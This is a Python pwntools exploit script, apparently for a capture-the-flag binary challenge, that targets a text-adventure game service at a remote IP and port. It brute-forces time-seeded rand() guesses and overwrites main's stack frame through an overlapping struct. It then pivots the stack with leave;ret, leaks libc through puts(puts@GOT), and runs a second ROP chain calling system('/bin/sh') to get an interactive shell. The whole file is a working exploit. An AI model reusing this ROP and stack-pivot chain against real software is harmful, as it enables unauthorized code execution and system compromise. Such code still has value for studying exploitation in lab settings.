#!/usr/bin/env python3

from pwn import *
import time, subprocess, struct, os

os.chdir(os.path.dirname(os.path.abspath(__file__)))

exe = ELF("./galdurs_bate_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.39.so")

context.binary = exe

# ROP gadgets from sub_0x404120
pop_rdi      = 0x4012be  # pop rdi; ret
pop_rbp      = 0x4012c7  # pop rbp; ret
xchg_rsi_rdi = 0x4012c2  # xchg rsi, rdi; ret
ret_gadget   = 0x40101a  # ret (for stack alignment)
leave_ret    = 0x40221e  # leave; ret (main's epilogue)

# PLT/GOT
puts_plt = exe.plt['puts']
puts_got = exe.got['puts']
main_addr = exe.symbols['main']

# Global buffer for stack pivot
player_desc = 0x405540

# libc offsets
libc_system = libc.symbols['system']
libc_binsh = next(libc.search(b'/bin/sh'))

# Rand helper using provided libc
def rand_for_seed(seed):
    """Compute rand() value for given seed using the challenge's libc 2.39."""
    result = subprocess.run(
        ['./ld-2.39.so', '--library-path', '.', '/tmp/rand_test', str(seed)],
        capture_output=True
    )
    return struct.unpack('<i', result.stdout[:4])[0]


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.GDB:
            gdb.attach(r)
    else:
        r = remote("178.105.86.125", 26102)
    return r


def create_player(r, name=b'Pwn', strength=1, dexterity=1, charisma=1):
    r.recvuntil(b'name:')
    r.send(name + b'\n')
    r.recvuntil(b'strength')
    r.send(str(strength).encode() + b'\n')
    r.recvuntil(b'dexterity')
    r.send(str(dexterity).encode() + b'\n')
    r.recvuntil(b'charisma')
    r.send(str(charisma).encode() + b'\n')


def navigate_to_riddle(r):
    """Navigate to the dialogue room (room 3)."""
    r.recvuntil(b'choice:')
    r.sendline(b'1')
    r.recvuntil(b'choice:')
    r.sendline(b'4')
    r.recvuntil(b'guess:')


def guess_on_existing(io, seed):
    """Send a single rand() guess on an already-navigated connection.
    Returns None always — caller should check response externally.
    """
    guess = rand_for_seed(seed)
    io.sendline(str(guess).encode())


def try_seed(seed):
    """Try a single seed by opening a fresh connection.
    Returns (io, seed) on success, None on failure.
    """
    io = conn()
    create_player(io)

    desc = build_description(build_stage1_rop())
    io.recvuntil(b'description:')
    io.send(desc)

    navigate_to_riddle(io)
    guess_on_existing(io, seed)

    resp = io.recvuntil([b'strength', b'Incorrect'], timeout=3)
    if b'strength' in resp:
        return io, seed
    io.close()
    return None


def add_menthara(r, canary, saved_rbp, return_addr):
    """Add Menthara with controlled stats.
    
    Menthara's struct overlays main's stack:
      - name     [rbp-0x10]  = "Menthara" (fixed)
      - strength [rbp-0x08]  = canary (WE CONTROL)
      - dexterity [rbp+0x00] = saved rbp (WE CONTROL) 
      - charisma  [rbp+0x08] = return address (WE CONTROL)
    """
    r.send(str(canary).encode() + b'\n')
    r.recvuntil(b'dexterity')
    r.send(str(saved_rbp).encode() + b'\n')
    r.recvuntil(b'charisma')
    r.send(str(return_addr).encode() + b'\n')


def build_stage1_rop():
    """ROP chain for libc leak via puts(puts@GOT), then return to main."""
    return flat(
        pop_rdi,
        puts_got,
        puts_plt,
        main_addr,
    )


def build_stage2_rop(binsh_addr, system_addr):
    """ROP chain to call system('/bin/sh')."""
    return flat(
        ret_gadget,     # stack alignment for movaps
        pop_rdi,
        binsh_addr,
        system_addr,
    )


def build_description(rop_chain):
    """Build the player_description content for stack pivot.
    
    Stack pivot via leave;ret:
      - First leave: mov rsp,rbp_main; pop rbp (loads player_desc); ret (to leave_ret)
      - Second leave: mov rsp,player_desc; pop rbp (loads from [player_desc+0]); 
                      ret (loads from [player_desc+8])
    
    So the ROP chain starts at player_desc + 8.
    """
    return flat({
        0: p64(0),          # dummy rbp for second leave's pop rbp
        8: rop_chain,       # ROP chain
    }, filler=b'\x00', length=200)


def main():
    now = int(time.time())
    WINDOW = 30  # try seeds ±30 seconds around captured time

    # Try seeds in a window around captured time.
    # Order: start at offset 0, then alternate ±1, ±2, ...
    offsets = [0]
    for i in range(1, WINDOW + 1):
        offsets += [i, -i]

    r = None
    found_seed = None
    for off in offsets:
        seed = now + off
        log.info(f"Trying seed={seed} (offset={off:+d})")
        result = try_seed(seed)
        if result is not None:
            r, found_seed = result
            break

    if r is None:
        log.error("Failed to solve riddle in any connection!")
        return

    log.success(f"Riddle solved (seed={found_seed})")

    # === STAGE 1: Leak libc ===
    canary = 0x1300  # from brute-force

    add_menthara(r, canary, player_desc, leave_ret)
    log.info(f"Added Menthara: canary={hex(canary)}, rbp={hex(player_desc)}, ret={hex(leave_ret)}")

    r.recvuntil(b'choice:')
    r.sendline(b'5')

    try:
        data = r.recv(6, timeout=5)
        if b'stack smashing' in data:
            log.error("Canary check failed! Need canary leak.")
            r.close()
            return

        if len(data) >= 6:
            leaked_puts = u64(data.ljust(8, b'\x00'))
            log.success(f"Leaked puts@libc: {hex(leaked_puts)}")

            libc_base = leaked_puts - libc.symbols['puts']
            log.success(f"Libc base: {hex(libc_base)}")

            system_addr = libc_base + libc_system
            binsh_addr = libc_base + libc_binsh
            log.success(f"system: {hex(system_addr)}")
            log.success(f"/bin/sh: {hex(binsh_addr)}")

            # Stage 2: game restarted via return-to-main
            r.recvuntil(b'name:')
            r.send(b'pwn\n')
            r.recvuntil(b'strength')
            r.send(b'1\n')
            r.recvuntil(b'dexterity')
            r.send(b'1\n')
            r.recvuntil(b'charisma')
            r.send(b'1\n')

            desc2 = build_description(build_stage2_rop(binsh_addr, system_addr))
            r.recvuntil(b'description:')
            r.send(desc2)

            # Solve riddle on the same restarted connection
            stage2_time = int(time.time())
            navigate_to_riddle(r)
            guess_on_existing(r, stage2_time)
            resp2 = r.recvuntil([b'strength', b'Incorrect'], timeout=3)
            if b'strength' not in resp2:
                log.error("Stage 2 riddle failed!")
                r.close()
                return

            # Use same canary (it doesn't change in the same process)
            add_menthara(r, canary, player_desc, leave_ret)

            r.recvuntil(b'choice:')
            r.sendline(b'5')

            log.success("Shell incoming!")
            r.interactive()
        else:
            log.warning("Unexpected data length")
    except EOFError:
        log.error("Connection closed (likely canary fail or network issue)")
    except Exception as e:
        log.error(f"Exception: {e}")

    r.close()


if __name__ == "__main__":
    main()
